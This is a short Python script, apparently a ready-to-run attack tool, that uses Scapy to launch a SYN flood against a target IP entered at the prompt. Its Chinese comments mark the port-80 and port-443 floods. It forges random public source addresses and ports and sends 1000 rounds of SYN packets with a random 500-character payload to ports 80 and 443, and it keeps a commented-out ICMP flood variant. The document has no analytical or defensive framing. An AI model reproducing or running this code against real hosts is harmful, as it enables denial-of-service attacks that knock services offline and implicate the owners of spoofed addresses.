import random
import string

from scapy.layers.inet import IP, TCP, ICMP
from scapy.sendrecv import sr1, send


def random_ip():
    i1 = 0
    # 排除局域网IP
    while i1 in (10,192,127,172,0):
        i1 = random.randint(1, 254)
    i2 = random.randint(1, 254)
    i3 = random.randint(1, 254)
    i4 = random.randint(1, 254)
    ip = f"{i1}.{i2}.{i3}.{i4}"
    print(ip)
    return ip


def random_port():
    port = random.randint(10000, 65535)
    return port


def flood(d_ip):
    payload = ''
    for i in range(10):
        srt = ''.join(random.sample(string.ascii_letters + string.digits, 50))
        payload = payload + srt
    for i in range(1000):
        s_ip = random_ip()
        s_port = random_port()
        # 80端口泛洪，设置verbose=0不显示发送过程
        send(IP(dst=d_ip, src=s_ip) / TCP(sport=s_port, dport=80, flags='S')/payload,verbose=0)
        # 泛洪443端口
        send(IP(dst=d_ip, src=s_ip) / TCP(sport=s_port, dport=443, flags='S')/payload,verbose=0)
        # ICMP泛洪
        # send(IP(dst=d_ip, src=s_ip) / ICMP()/payload,verbose=0)


if __name__ == '__main__':
    ip = input('IP:')
    flood(ip)
    # for i in range(0,10):
    #     random_ip()